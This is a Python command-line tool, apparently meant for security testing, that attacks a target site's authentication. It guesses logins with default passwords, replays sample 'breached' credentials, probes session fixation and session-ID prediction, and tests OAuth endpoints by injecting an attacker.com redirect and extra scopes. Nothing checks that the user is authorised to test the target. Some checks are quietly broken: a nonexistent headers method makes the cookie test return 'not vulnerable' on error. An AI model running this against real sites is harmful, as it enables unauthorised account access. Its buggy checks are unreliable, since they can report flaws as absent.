#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import time
import os
import json
import re
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import concurrent.futures
import itertools
import random
import string
import hashlib
import base64

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("auth_attacks.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("AuthAttacks")

class AuthAttacker:
    """Implementation of various auth attack techniques for security testing"""
    
    def __init__(self, target_url, output_dir="security_tests"):
        self.target_url = target_url
        self.output_dir = output_dir
        self.results = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": target_url,
            "brute_force": {},
            "session_attacks": {},
            "oauth_vulnerabilities": {}
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.login_page = None
        self.login_form = None
        self.max_login_attempts = 10  # Limited for security testing
    
    def find_login_form(self):
        """Find login form on the target site"""
        logger.info("Looking for login form")
        
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try to find login link
            login_links = []
            for link in soup.find_all('a', href=True):
                href = link['href'].lower()
                link_text = link.text.lower()
                if any(term in href or term in link_text for term in ['login', 'signin', 'log in', 'sign in', 'auth']):
                    login_links.append(urljoin(self.target_url, link['href']))
            
            # Check the main page for forms
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all('input')
                input_types = [i.get('type', '').lower() for i in inputs]
                input_names = [i.get('name', '').lower() for i in inputs]
                
                # Look for password field
                if 'password' in input_types or any('password' in name for name in input_names):
                    logger.info("Found login form on main page")
                    self.login_page = self.target_url
                    self.login_form = {
                        'action': urljoin(self.target_url, form.get('action', '')),
                        'method': form.get('method', 'post').lower(),
                        'inputs': [(i.get('name', ''), i.get('type', '')) for i in inputs]
                    }
                    return self.login_form
            
            # If not found, check login links
            for link in login_links:
                try:
                    response = requests.get(link, headers=self.headers, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    forms = soup.find_all('form')
                    for form in forms:
                        inputs = form.find_all('input')
                        input_types = [i.get('type', '').lower() for i in inputs]
                        input_names = [i.get('name', '').lower() for i in inputs]
                        
                        # Look for password field
                        if 'password' in input_types or any('password' in name for name in input_names):
                            logger.info(f"Found login form at {link}")
                            self.login_page = link
                            self.login_form = {
                                'action': urljoin(link, form.get('action', '')),
                                'method': form.get('method', 'post').lower(),
                                'inputs': [(i.get('name', ''), i.get('type', '')) for i in inputs]
                            }
                            return self.login_form
                except Exception as e:
                    logger.error(f"Error checking login link {link}: {str(e)}")
            
            logger.warning("No login form found")
            return None
            
        except Exception as e:
            logger.error(f"Error finding login form: {str(e)}")
            return None
    
    #==========================================
    # Brute Force Attack Methods
    #==========================================
    
    def test_dictionary_attack(self, usernames=None, passwords=None, is_csrf_protected=True):
        """Test for dictionary attack vulnerability"""
        logger.info("Testing for dictionary attack vulnerability")
        
        if not self.login_form:
            if not self.find_login_form():
                logger.error("Cannot perform dictionary attack without login form")
                return None
        
        # Default test credentials
        if not usernames:
            usernames = ['admin', 'administrator', 'user', 'test', 'root']
        if not passwords:
            passwords = ['password', 'admin', '123456', 'P@ssw0rd', 'qwerty']
        
        # Identify username and password fields
        username_field = None
        password_field = None
        other_fields = {}
        csrf_field = None
        
        for name, field_type in self.login_form['inputs']:
            if not name:
                continue
                
            if field_type == 'password':
                password_field = name
            elif any(term in name.lower() for term in ['user', 'email', 'login', 'name']):
                username_field = name
            elif any(term in name.lower() for term in ['csrf', 'token', 'nonce']):
                csrf_field = name
            elif field_type != 'submit':
                other_fields[name] = ''  # Store other fields
        
        if not username_field or not password_field:
            logger.error("Could not identify username or password fields")
            return None
        
        # Test for rate limiting
        rate_limited = self._check_rate_limiting(username_field, password_field, csrf_field)
        
        # Attempt limited dictionary attack
        successful_logins = []
        login_url = self.login_form['action'] or self.login_page
        
        if rate_limited:
            logger.info("Rate limiting detected, limiting brute force test")
            # Just try a couple of common combinations
            test_pairs = [('admin', 'admin'), ('admin', 'password'), ('admin', '123456')]
        else:
            # Create a limited list of username/password combinations
            test_pairs = list(itertools.product(usernames[:3], passwords[:3]))
            random.shuffle(test_pairs)
            test_pairs = test_pairs[:self.max_login_attempts]  # Limit attempts
        
        # Attempt login with the test pairs
        for username, password in test_pairs:
            try:
                # Prepare form data
                form_data = other_fields.copy()
                form_data[username_field] = username
                form_data[password_field] = password
                
                # Get CSRF token if needed
                if is_csrf_protected and csrf_field:
                    csrf_token = self._get_csrf_token(csrf_field)
                    if csrf_token:
                        form_data[csrf_field] = csrf_token
                
                # Make login request
                if self.login_form['method'] == 'post':
                    response = requests.post(
                        login_url,
                        data=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        login_url,
                        params=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                
                # Check for login success
                login_success = self._check_login_success(response, username)
                if login_success:
                    successful_logins.append({
                        'username': username,
                        'password': password,
                        'url': login_url
                    })
                    logger.warning(f"Found valid credentials: {username}/{password}")
                
                # Brief pause to avoid overwhelming the server
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Error testing {username}/{password}: {str(e)}")
        
        results = {
            'url': login_url,
            'rate_limited': rate_limited,
            'vulnerable': len(successful_logins) > 0,
            'successful_logins': successful_logins,
            'username_field': username_field,
            'password_field': password_field,
            'csrf_protected': is_csrf_protected and csrf_field is not None,
            'csrf_field': csrf_field
        }
        
        return results
    
    def test_credential_stuffing(self, breached_credentials=None):
        """Test for credential stuffing vulnerability using "breached" credentials"""
        logger.info("Testing for credential stuffing vulnerability")
        
        if not self.login_form:
            if not self.find_login_form():
                logger.error("Cannot perform credential stuffing without login form")
                return None
        
        # Simulated "breached" credentials for testing
        if not breached_credentials:
            breached_credentials = [
                ('john.doe@example.com', 'P@ssw0rd123'),
                ('support@' + urlparse(self.target_url).netloc, 'support123'),
                ('admin@' + urlparse(self.target_url).netloc, 'admin123'),
                ('user@' + urlparse(self.target_url).netloc, 'user2023'),
                ('info@' + urlparse(self.target_url).netloc, 'company2023')
            ]
        
        # Identify username and password fields
        username_field = None
        password_field = None
        other_fields = {}
        csrf_field = None
        
        for name, field_type in self.login_form['inputs']:
            if not name:
                continue
                
            if field_type == 'password':
                password_field = name
            elif any(term in name.lower() for term in ['user', 'email', 'login', 'name']):
                username_field = name
            elif any(term in name.lower() for term in ['csrf', 'token', 'nonce']):
                csrf_field = name
            elif field_type != 'submit':
                other_fields[name] = ''
        
        if not username_field or not password_field:
            logger.error("Could not identify username or password fields")
            return None
        
        # Test for rate limiting
        rate_limited = self._check_rate_limiting(username_field, password_field, csrf_field)
        
        # Attempt credential stuffing with limited set
        successful_logins = []
        login_url = self.login_form['action'] or self.login_page
        
        # Limit the number of attempts
        test_credentials = breached_credentials[:self.max_login_attempts]
        
        for username, password in test_credentials:
            try:
                # Prepare form data
                form_data = other_fields.copy()
                form_data[username_field] = username
                form_data[password_field] = password
                
                # Get CSRF token if needed
                if csrf_field:
                    csrf_token = self._get_csrf_token(csrf_field)
                    if csrf_token:
                        form_data[csrf_field] = csrf_token
                
                # Make login request
                if self.login_form['method'] == 'post':
                    response = requests.post(
                        login_url,
                        data=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        login_url,
                        params=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                
                # Check for login success
                login_success = self._check_login_success(response, username)
                if login_success:
                    successful_logins.append({
                        'username': username,
                        'password': password,
                        'url': login_url
                    })
                    logger.warning(f"Found valid credentials via stuffing: {username}/{password}")
                
                # Brief pause to avoid overwhelming the server
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Error testing {username}/{password}: {str(e)}")
        
        results = {
            'url': login_url,
            'rate_limited': rate_limited,
            'vulnerable': len(successful_logins) > 0,
            'successful_logins': successful_logins,
            'username_field': username_field,
            'password_field': password_field
        }
        
        return results
    
    def _check_rate_limiting(self, username_field, password_field, csrf_field=None):
        """Check if the login form is protected by rate limiting"""
        logger.info("Checking for rate limiting")
        
        login_url = self.login_form['action'] or self.login_page
        wrong_password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Make several failed login attempts
        blocked = False
        for i in range(3):  # Just a few attempts to check
            try:
                # Prepare form data
                form_data = {
                    username_field: 'admin',
                    password_field: wrong_password + str(i)  # Different wrong password each time
                }
                
                # Get CSRF token if needed
                if csrf_field:
                    csrf_token = self._get_csrf_token(csrf_field)
                    if csrf_token:
                        form_data[csrf_field] = csrf_token
                
                # Make login request
                if self.login_form['method'] == 'post':
                    response = requests.post(
                        login_url,
                        data=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                else:
                    response = requests.get(
                        login_url,
                        params=form_data,
                        headers=self.headers,
                        allow_redirects=True,
                        timeout=10
                    )
                
                # Check for rate limiting evidence
                if response.status_code in [429, 403] or 'too many' in response.text.lower() or 'rate limit' in response.text.lower():
                    blocked = True
                    break
                
                # Brief pause to avoid overwhelming the server
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Error in rate limiting check: {str(e)}")
                return False  # Assume no rate limiting if error
        
        return blocked
    
    def _get_csrf_token(self, csrf_field):
        """Get CSRF token from the login page"""
        try:
            response = requests.get(self.login_page, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try to find the CSRF token in a form input
            csrf_input = soup.find('input', {'name': csrf_field})
            if csrf_input and csrf_input.get('value'):
                return csrf_input.get('value')
            
            # Try to find it as a meta tag
            csrf_meta = soup.find('meta', {'name': re.compile(r'csrf', re.I)})
            if csrf_meta and csrf_meta.get('content'):
                return csrf_meta.get('content')
            
            return None
        except Exception as e:
            logger.error(f"Error getting CSRF token: {str(e)}")
            return None
    
    def _check_login_success(self, response, username):
        """Check if a login attempt was successful"""
        # This is a basic check and may need to be customized
        if response.status_code in [200, 302]:
            # Look for success indicators
            if any(term in response.url.lower() for term in ['dashboard', 'account', 'profile', 'home', 'welcome']):
                return True
            
            # Look for logout links - indication of logged in state
            soup = BeautifulSoup(response.text, 'html.parser')
            logout_links = soup.find_all('a', href=True, text=re.compile(r'logout|sign out|log out', re.I))
            if logout_links:
                return True
            
            # Look for username in page
            if username.lower() in response.text.lower():
                return True
            
            # Look for common error messages as negative indicators
            error_terms = ['invalid', 'incorrect', 'failed', 'wrong', 'error', 'bad']
            error_found = False
            
            for term in error_terms:
                if term in response.text.lower():
                    error_found = True
                    break
            
            return not error_found
        
        return False
    
    #==========================================
    # Session Attack Methods
    #==========================================
    
    def test_session_fixation(self):
        """Test for session fixation vulnerability"""
        logger.info("Testing for session fixation vulnerability")
        
        # First, we need to analyze cookie behavior
        session_cookie_name = None
        try:
            # Make first request to get cookies
            response1 = requests.get(self.target_url, headers=self.headers, timeout=10)
            cookies1 = response1.cookies
            
            # Find potential session cookies
            for cookie in cookies1:
                if any(name in cookie.name.lower() for name in ['sess', 'sid', 'auth', 'id']):
                    session_cookie_name = cookie.name
                    break
            
            if not session_cookie_name:
                # If no typical session cookie name found, use the first cookie
                if cookies1:
                    session_cookie_name = next(iter(cookies1.keys()))
                else:
                    logger.warning("No cookies found, cannot test session fixation")
                    return {
                        'vulnerable': False,
                        'message': "No cookies found"
                    }
            
            # Get current session ID
            original_session_id = cookies1.get(session_cookie_name)
            
            # Find login form if needed
            if not self.login_form:
                self.find_login_form()
            
            # If login form found, check if session changes after login
            if self.login_form:
                # Attempt to access login page with existing cookie
                cookies = {session_cookie_name: original_session_id}
                login_url = self.login_page
                
                login_response = requests.get(
                    login_url,
                    cookies=cookies,
                    headers=self.headers,
                    timeout=10
                )
                
                # Check if we still have the same session ID after visiting login page
                post_login_cookie = login_response.cookies.get(session_cookie_name)
                
                if post_login_cookie and post_login_cookie != original_session_id:
                    # Session ID changed, not vulnerable to fixation
                    return {
                        'vulnerable': False,
                        'cookie_name': session_cookie_name,
                        'message': "Session ID changes when visiting login page, not vulnerable to fixation"
                    }
            
            # Test 2: Check if the server accepts arbitrary session IDs
            fake_session_id = 'test_' + ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            cookies = {session_cookie_name: fake_session_id}
            
            # Attempt request with fake session ID
            response2 = requests.get(
                self.target_url,
                cookies=cookies,
                headers=self.headers,
                timeout=10
            )
            
            # Check if our fake session ID was accepted
            returned_cookie = response2.cookies.get(session_cookie_name)
            
            # If the server didn't change our fake ID, it might be vulnerable
            if not returned_cookie or returned_cookie == fake_session_id:
                return {
                    'vulnerable': True,
                    'cookie_name': session_cookie_name,
                    'message': "Server accepts arbitrary session IDs, potentially vulnerable to session fixation"
                }
            else:
                return {
                    'vulnerable': False,
                    'cookie_name': session_cookie_name,
                    'message': "Server rejects arbitrary session IDs, not vulnerable to session fixation"
                }
            
        except Exception as e:
            logger.error(f"Error testing session fixation: {str(e)}")
            return {
                'vulnerable': False,
                'error': str(e)
            }
    
    def test_session_hijacking(self):
        """Test for session hijacking vulnerabilities"""
        logger.info("Testing for session hijacking vulnerabilities")
        
        try:
            # Make request to get cookies
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            cookies = response.cookies
            
            # Look for session cookies
            session_cookies = {}
            for cookie in cookies:
                if any(name in cookie.name.lower() for name in ['sess', 'sid', 'auth', 'id']):
                    session_cookies[cookie.name] = {
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'expires': cookie.expires,
                        'secure': cookie.secure,
                        'httponly': cookie.has_nonstandard_attr('httponly')
                    }
            
            if not session_cookies:
                logger.warning("No session cookies found")
                return {
                    'vulnerable': False,
                    'message': "No session cookies found"
                }
            
            # Check for security issues
            issues = []
            
            for name, cookie in session_cookies.items():
                # Check if cookie is secure
                if not cookie['secure']:
                    issues.append(f"Cookie '{name}' is not secure, vulnerable to MITM attacks")
                
                # Check if cookie is HttpOnly
                if not cookie['httponly']:
                    issues.append(f"Cookie '{name}' is not HttpOnly, vulnerable to XSS cookie theft")
                
                # Check for SameSite attribute (need to use raw headers)
                same_site = False
                if 'Set-Cookie' in response.headers:
                    set_cookie_headers = response.headers.get_all('Set-Cookie')
                    for header in set_cookie_headers:
                        if name in header and 'SameSite' in header:
                            same_site = True
                            break
                
                if not same_site:
                    issues.append(f"Cookie '{name}' does not have SameSite attribute, vulnerable to CSRF")
            
            return {
                'vulnerable': len(issues) > 0,
                'session_cookies': session_cookies,
                'issues': issues
            }
            
        except Exception as e:
            logger.error(f"Error testing session hijacking: {str(e)}")
            return {
                'vulnerable': False,
                'error': str(e)
            }
    
    def test_session_prediction(self):
        """Test for session prediction vulnerabilities"""
        logger.info("Testing for session prediction vulnerabilities")
        
        try:
            # Get multiple session IDs to analyze
            session_ids = []
            session_cookie_name = None
            
            for _ in range(5):  # Get 5 samples
                response = requests.get(
                    self.target_url,
                    headers=self.headers,
                    timeout=10
                )
                
                # Find session cookie
                for cookie in response.cookies:
                    if any(name in cookie.name.lower() for name in ['sess', 'sid', 'auth', 'id']):
                        if not session_cookie_name:
                            session_cookie_name = cookie.name
                        
                        if cookie.name == session_cookie_name:
                            session_ids.append(cookie.value)
                            break
                
                # Clear cookies for next request
                session = requests.Session()
                session.cookies.clear()
                
                # Small delay
                time.sleep(1)
            
            if not session_ids or len(session_ids) < 3:
                logger.warning("Not enough session IDs collected for analysis")
                return {
                    'vulnerable': False,
                    'message': "Not enough session IDs for analysis"
                }
            
            # Analyze session IDs for predictability
            analysis = {
                'session_ids': session_ids,
                'cookie_name': session_cookie_name,
                'length': len(session_ids[0]) if session_ids else 0,
                'numeric_only': all(s.isdigit() for s in session_ids),
                'sequential': False,
                'timestamp_based': False,
                'entropy': self._calculate_entropy(session_ids)
            }
            
            # Check if IDs are sequential
            if analysis['numeric_only']:
                try:
                    # Convert to integers and check if they increment
                    numeric_ids = [int(s) for s in session_ids]
                    diffs = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
                    
                    # If differences are small and consistent, might be sequential
                    if all(0 < d < 100 for d in diffs) and max(diffs) - min(diffs) < 10:
                        analysis['sequential'] = True
                except:
                    pass
            
            # Check if IDs may be timestamp-based
            if analysis['numeric_only'] and len(session_ids[0]) >= 10:
                try:
                    # Check if first part of ID could be a timestamp
                    timestamps = [int(s[:10]) for s in session_ids]
                    current_time = int(time.time())
                    
                    # If all values are close to current timestamp, might be timestamp-based
                    if all(current_time - 86400 < t < current_time + 3600 for t in timestamps):
                        analysis['timestamp_based'] = True
                except:
                    pass
            
            # Determine vulnerability based on analysis
            vulnerable = (
                analysis['numeric_only'] or
                analysis['sequential'] or
                analysis['timestamp_based'] or
                analysis['entropy'] < 3.0  # Low entropy suggests predictability
            )
            
            return {
                'vulnerable': vulnerable,
                'analysis': analysis,
                'message': "Session IDs may be predictable" if vulnerable else "Session IDs appear random"
            }
            
        except Exception as e:
            logger.error(f"Error testing session prediction: {str(e)}")
            return {
                'vulnerable': False,
                'error': str(e)
            }
    
    def _calculate_entropy(self, values):
        """Calculate Shannon entropy of session IDs to measure randomness"""
        if not values:
            return 0
            
        # Use first value as sample
        value = values[0]
        
        # Count character frequencies
        frequencies = {}
        for char in value:
            if char not in frequencies:
                frequencies[char] = 0
            frequencies[char] += 1
        
        # Calculate entropy
        entropy = 0
        for char, freq in frequencies.items():
            probability = freq / len(value)
            entropy -= probability * (math.log(probability) / math.log(2))
        
        return entropy
    
    #==========================================
    # OAuth Vulnerability Methods
    #==========================================
    
    def find_oauth_endpoints(self):
        """Find OAuth endpoints on the target site"""
        logger.info("Looking for OAuth endpoints")
        
        oauth_endpoints = []
        
        try:
            response = requests.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for OAuth buttons/links
            oauth_providers = ['google', 'facebook', 'twitter', 'github', 'linkedin', 'microsoft', 'apple']
            
            for link in soup.find_all('a', href=True):
                href = link['href'].lower()
                link_text = link.text.lower()
                
                # Check for OAuth provider mentions
                if any(provider in href or provider in link_text for provider in oauth_providers):
                    # Check for OAuth flow indicators
                    if any(term in href for term in ['oauth', 'authorize', 'auth', 'signin', 'login']):
                        oauth_endpoints.append({
                            'url': urljoin(self.target_url, link['href']),
                            'provider': next((p for p in oauth_providers if p in href or p in link_text), 'unknown'),
                            'text': link.text.strip(),
                            'type': 'link'
                        })
            
            # Also look for OAuth in forms
            for form in soup.find_all('form'):
                form_html = str(form).lower()
                
                if any(provider in form_html for provider in oauth_providers) and \
                   any(term in form_html for term in ['oauth', 'authorize', 'auth', 'signin', 'login']):
                    
                    form_action = form.get('action', '')
                    oauth_endpoints.append({
                        'url': urljoin(self.target_url, form_action),
                        'provider': next((p for p in oauth_providers if p in form_html), 'unknown'),
                        'method': form.get('method', 'get').lower(),
                        'type': 'form'
                    })
            
            # Look for OAuth in scripts
            for script in soup.find_all('script'):
                if script.string:
                    script_text = script.string.lower()
                    
                    # Look for OAuth client IDs and auth endpoints
                    if any(provider in script_text for provider in oauth_providers) and \
                       any(term in script_text for term in ['oauth', 'client_id', 'client id', 'auth', 'redirect_uri']):
                        
                        # Try to extract client ID
                        client_id_match = re.search(r'client_?id["\']?\s*[:=]\s*["\']([^"\']+)["\']', script_text)
                        redirect_uri_match = re.search(r'redirect_uri["\']?\s*[:=]\s*["\']([^"\']+)["\']', script_text)
                        
                        client_id = client_id_match.group(1) if client_id_match else None
                        redirect_uri = redirect_uri_match.group(1) if redirect_uri_match else None
                        
                        oauth_endpoints.append({
                            'provider': next((p for p in oauth_providers if p in script_text), 'unknown'),
                            'client_id': client_id,
                            'redirect_uri': redirect_uri,
                            'type': 'script'
                        })
            
            logger.info(f"Found {len(oauth_endpoints)} potential OAuth endpoints")
            
        except Exception as e:
            logger.error(f"Error finding OAuth endpoints: {str(e)}")
            
        return oauth_endpoints
    
    def test_open_redirect(self, oauth_endpoints):
        """Test for open redirect vulnerabilities in OAuth endpoints"""
        logger.info("Testing for open redirect vulnerabilities in OAuth")
        
        vulnerabilities = []
        
        for endpoint in oauth_endpoints:
            if endpoint['type'] in ['link', 'form'] and 'url' in endpoint:
                url = endpoint['url']
                
                # Parse the URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                # Look for redirect parameters
                redirect_params = []
                for param in query_params:
                    if any(term in param.lower() for term in ['redirect', 'return', 'callback', 'next', 'url']):
                        redirect_params.append(param)
                
                if not redirect_params:
                    continue
                
                # Test for open redirect in each parameter
                for param in redirect_params:
                    try:
                        # Try a malicious redirect
                        malicious_url = "https://attacker.com"
                        
                        # Create a modified query
                        modified_query = query_params.copy()
                        modified_query[param] = [malicious_url]
                        
                        # Rebuild the URL
                        query_string = '&'.join(f"{k}={v[0]}" for k, v in modified_query.items())
                        test_url = parsed_url._replace(query=query_string).geturl()
                        
                        # Send the request
                        response = requests.get(
                            test_url,
                            headers=self.headers,
                            allow_redirects=False,  # Don't follow redirects
                            timeout=10
                        )
                        
                        # Check for redirect to malicious URL
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            
                            if malicious_url in location:
                                vulnerabilities.append({
                                    'type': 'Open Redirect',
                                    'url': url,
                                    'param': param,
                                    'provider': endpoint.get('provider', 'unknown'),
                                    'evidence': f"Redirected to: {location}",
                                    'severity': 'High'
                                })
                        
                    except Exception as e:
                        logger.error(f"Error testing open redirect for {url}, param {param}: {str(e)}")
        
        return vulnerabilities
    
    def test_token_theft(self, oauth_endpoints):
        """Test for OAuth token theft vulnerabilities"""
        logger.info("Testing for OAuth token theft vulnerabilities")
        
        vulnerabilities = []
        
        for endpoint in oauth_endpoints:
            # Look for redirect_uri parameters that might be vulnerable
            if endpoint['type'] == 'script' and 'redirect_uri' in endpoint:
                redirect_uri = endpoint['redirect_uri']
                
                # Check if redirect URI is vulnerable
                parsed_uri = urlparse(redirect_uri)
                
                # Check for proper host validation
                if not parsed_uri.netloc or parsed_uri.netloc == 'localhost':
                    vulnerabilities.append({
                        'type': 'OAuth Token Theft',
                        'provider': endpoint.get('provider', 'unknown'),
                        'redirect_uri': redirect_uri,
                        'issue': 'Insecure redirect_uri (localhost or empty domain)',
                        'severity': 'High',
                        'evidence': f"Found redirect_uri: {redirect_uri}"
                    })
                    continue
                
                # Check if redirect URI uses HTTP (not HTTPS)
                if parsed_uri.scheme == 'http':
                    vulnerabilities.append({
                        'type': 'OAuth Token Theft',
                        'provider': endpoint.get('provider', 'unknown'),
                        'redirect_uri': redirect_uri,
                        'issue': 'Insecure redirect_uri (HTTP instead of HTTPS)',
                        'severity': 'High',
                        'evidence': f"Found redirect_uri: {redirect_uri}"
                    })
            
            # Look for client IDs exposed in frontend code
            if endpoint['type'] == 'script' and 'client_id' in endpoint:
                client_id = endpoint['client_id']
                
                vulnerabilities.append({
                    'type': 'OAuth Client Exposure',
                    'provider': endpoint.get('provider', 'unknown'),
                    'client_id': client_id,
                    'issue': 'OAuth client ID exposed in frontend code',
                    'severity': 'Medium',
                    'evidence': f"Found client_id: {client_id}"
                })
        
        return vulnerabilities
    
    def test_scope_manipulation(self, oauth_endpoints):
        """Test for OAuth scope manipulation vulnerabilities"""
        logger.info("Testing for OAuth scope manipulation vulnerabilities")
        
        vulnerabilities = []
        
        for endpoint in oauth_endpoints:
            if endpoint['type'] in ['link', 'form'] and 'url' in endpoint:
                url = endpoint['url']
                
                # Parse the URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                # Check if scope parameter exists
                if 'scope' in query_params:
                    original_scope = query_params['scope'][0]
                    
                    # Try to manipulate scope
                    try:
                        # Add potentially sensitive scopes
                        manipulated_scopes = [
                            original_scope + " email profile",
                            original_scope + " user_email user_photos",
                            original_scope + " user.read mail.read",
                            "admin " + original_scope
                        ]
                        
                        for new_scope in manipulated_scopes:
                            # Create a modified query
                            modified_query = query_params.copy()
                            modified_query['scope'] = [new_scope]
                            
                            # Rebuild the URL
                            query_string = '&'.join(f"{k}={v[0]}" for k, v in modified_query.items())
                            test_url = parsed_url._replace(query=query_string).geturl()
                            
                            # Send the request
                            response = requests.get(
                                test_url,
                                headers=self.headers,
                                allow_redirects=False,  # Don't follow redirects
                                timeout=10
                            )
                            
                            # If request doesn't error out, the scope might be accepted
                            if response.status_code < 400:
                                vulnerabilities.append({
                                    'type': 'OAuth Scope Manipulation',
                                    'url': url,
                                    'provider': endpoint.get('provider', 'unknown'),
                                    'original_scope': original_scope,
                                    'manipulated_scope': new_scope,
                                    'evidence': f"Server accepted modified scope",
                                    'severity': 'Medium'
                                })
                                break  # Found one vulnerability, no need for more tests
                        
                    except Exception as e:
                        logger.error(f"Error testing scope manipulation for {url}: {str(e)}")
        
        return vulnerabilities
    
    #==========================================
    # Main Testing Methods
    #==========================================
    
    def run_brute_force_tests(self):
        """Run all brute force attack tests"""
        logger.info("Starting brute force attack tests")
        
        # Run dictionary attack test
        dictionary_results = self.test_dictionary_attack()
        
        # Run credential stuffing test
        stuffing_results = self.test_credential_stuffing()
        
        # Combine results
        self.results["brute_force"] = {
            "dictionary_attack": dictionary_results,
            "credential_stuffing": stuffing_results,
            "vulnerable": (dictionary_results and dictionary_results.get('vulnerable', False)) or 
                          (stuffing_results and stuffing_results.get('vulnerable', False))
        }
        
        return self.results["brute_force"]
    
    def run_session_attack_tests(self):
        """Run all session attack tests"""
        logger.info("Starting session attack tests")
        
        # Run session fixation test
        fixation_results = self.test_session_fixation()
        
        # Run session hijacking test
        hijacking_results = self.test_session_hijacking()
        
        # Run session prediction test
        prediction_results = self.test_session_prediction()
        
        # Combine results
        self.results["session_attacks"] = {
            "session_fixation": fixation_results,
            "session_hijacking": hijacking_results,
            "session_prediction": prediction_results,
            "vulnerable": fixation_results.get('vulnerable', False) or 
                          hijacking_results.get('vulnerable', False) or
                          prediction_results.get('vulnerable', False)
        }
        
        return self.results["session_attacks"]
    
    def run_oauth_vulnerability_tests(self):
        """Run all OAuth vulnerability tests"""
        logger.info("Starting OAuth vulnerability tests")
        
        # Find OAuth endpoints
        oauth_endpoints = self.find_oauth_endpoints()
        
        if not oauth_endpoints:
            logger.warning("No OAuth endpoints found")
            self.results["oauth_vulnerabilities"] = {
                "vulnerable": False,
                "message": "No OAuth endpoints found"
            }
            return self.results["oauth_vulnerabilities"]
        
        # Run open redirect test
        redirect_results = self.test_open_redirect(oauth_endpoints)
        
        # Run token theft test
        token_theft_results = self.test_token_theft(oauth_endpoints)
        
        # Run scope manipulation test
        scope_results = self.test_scope_manipulation(oauth_endpoints)
        
        # Combine results
        all_vulnerabilities = redirect_results + token_theft_results + scope_results
        
        self.results["oauth_vulnerabilities"] = {
            "oauth_endpoints": oauth_endpoints,
            "open_redirect": redirect_results,
            "token_theft": token_theft_results,
            "scope_manipulation": scope_results,
            "vulnerable": len(all_vulnerabilities) > 0,
            "vulnerabilities_count": len(all_vulnerabilities),
            "vulnerabilities": all_vulnerabilities
        }
        
        return self.results["oauth_vulnerabilities"]
    
    def run_all_tests(self):
        """Run all authentication attack tests"""
        logger.info(f"Starting all authentication attack tests against {self.target_url}")
        
        # Run all test groups
        self.run_brute_force_tests()
        self.run_session_attack_tests()
        self.run_oauth_vulnerability_tests()
        
        # Set overall vulnerability status
        self.results["vulnerable"] = (
            self.results["brute_force"].get("vulnerable", False) or
            self.results["session_attacks"].get("vulnerable", False) or
            self.results["oauth_vulnerabilities"].get("vulnerable", False)
        )
        
        logger.info(f"Authentication attack testing completed. Vulnerable: {self.results['vulnerable']}")
        
        return self.results
    
    def save_results(self, filename=None):
        """Save scan results to file"""
        if not filename:
            filename = os.path.join(self.output_dir, "auth_attacks_results.json")
            
        # Ensure directory exists
        os.makedirs(os.path.dirname(filename), exist_ok=True)
            
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
            
        logger.info(f"Results saved to {filename}")
        return filename

# Main function for standalone usage
def main():
    import argparse
    import math  # Required for entropy calculation
    
    parser = argparse.ArgumentParser(description="Authentication Attack Testing Tool")
    parser.add_argument("target", help="Target URL to test")
    parser.add_argument("--output", "-o", help="Output directory for results", default="security_tests")
    parser.add_argument("--brute", action="store_true", help="Run only brute force tests")
    parser.add_argument("--session", action="store_true", help="Run only session attack tests")
    parser.add_argument("--oauth", action="store_true", help="Run only OAuth vulnerability tests")
    parser.add_argument("--all", action="store_true", help="Run all tests (default)")
    
    args = parser.parse_args()
    
    auth_attacker = AuthAttacker(args.target, args.output)
    
    if args.brute:
        auth_attacker.run_brute_force_tests()
    elif args.session:
        auth_attacker.run_session_attack_tests()
    elif args.oauth:
        auth_attacker.run_oauth_vulnerability_tests()
    else:
        # Run all by default
        auth_attacker.run_all_tests()
        
    auth_attacker.save_results()

if __name__ == "__main__":
    import math  # Required for entropy calculation
    main() 